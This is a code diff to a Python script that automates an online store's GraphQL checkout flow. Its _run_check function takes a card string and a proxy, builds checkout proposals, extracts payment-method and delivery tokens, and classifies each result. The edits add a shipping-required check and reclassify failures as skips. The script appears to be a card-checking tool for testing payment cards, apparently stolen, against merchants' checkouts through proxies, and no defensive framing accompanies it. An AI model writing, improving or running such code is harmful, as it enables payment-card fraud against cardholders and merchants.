@@ -214,6 +214,14 @@ def _total_from_rejected(b):
     except Exception: pass
     return ""
 
+def _is_shipping_required(b):
+    try:
+        d = json.loads(b)
+        sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
+               .get("result",{}).get("sellerProposal",{}))
+        return sp.get("isShippingRequired", True)
+    except Exception: return True
+
 def _payment_method_id(b):
     try:
         data = json.loads(b)
@@ -313,7 +321,6 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
 # 🛒 PAYLOAD BUILDER (Strictly Digital)
 # ─────────────────────────────────────────────────────────────────────────────
 def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
-    # We only need address for the final Proposal 3, but for digital it's ignored
     if addr:
         sa   = _street_addr(addr["fn"], addr["ln"], addr)
         dest = {"partialStreetAddress": {"address1":sa["address1"],"city":sa["city"],
@@ -342,7 +349,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
                         "options": {},
                     },
                     "targetMerchandiseLines": {"any": True},
-                    "deliveryMethodTypes":    ["NONE"], # FIXED: Digital only
+                    "deliveryMethodTypes":    ["NONE"], # Digital only
                     "expectedTotalPrice":     {"any": True},
                     "destinationChanged":     True,
                 }],
@@ -615,7 +622,7 @@ def _run_check(card_str, proxy_str):
             if r3.status_code == 200:
                 r3_text = r3.text
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
-                    return _resp("SHIPPING_FAILED", price=f"{amount} {currency}")
+                    return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") # SKIP instead of fail
                 
                 pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
                 del_h  = _delivery_handle(r3_text)
@@ -625,16 +632,16 @@ def _run_check(card_str, proxy_str):
                 queue_token = _queue_token(r3_text) or queue_token
                 shipping_required = _is_shipping_required(r3_text)
         except Exception:
-            return _resp("SHIPPING_FAILED", price=f"{amount} {currency}")
+            return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
 
         if not pm_id:
             pm_id = _payment_method_id_from_html(checkout_html)
 
         if not pm_id:
-            return _resp("SHIPPING_FAILED", price=f"{amount_f} {currency}")
+            return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
 
         if shipping_required and (not del_h or not signed):
-            return _resp("SHIPPING_FAILED", price=f"{amount_f} {currency}")
+            return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
         # ═══ Step 5: PCI ═══
         ident_sig = _ident_sig(checkout_html)
